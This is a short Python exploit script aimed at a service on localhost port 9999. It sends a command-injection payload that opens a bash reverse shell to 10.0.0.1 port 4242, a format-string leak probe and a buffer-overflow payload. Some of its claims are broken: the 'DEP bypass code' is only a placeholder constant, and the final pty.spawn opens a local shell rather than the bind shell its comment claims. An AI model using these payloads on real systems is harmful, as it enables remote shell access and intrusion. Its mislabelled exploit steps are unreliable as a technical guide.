import socket

target_host = "127.0.0.1" 
target_port = 9999

# Create socket 
exploit = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
exploit.connect((target_host, target_port))

# Test command injection
exploit.send(b"COMMAND /bin/bash -i >& /dev/tcp/10.0.0.1/4242 0>&1") 

# Test format string bug
fmtstr = b"PRINT %x." * 100
exploit.send(fmtstr)
leak = exploit.recv(2048)
print(leak)

# Test buffer overflow
payload = b"A"*100 + b"B"*4 + b"\xca\xfe\xba\xbe" # DEP bypass code
exploit.send(b"OVERFLOW " + payload)  

# Interact with bind shell
import pty
pty.spawn("/bin/bash")

# Cleanup
exploit.close()
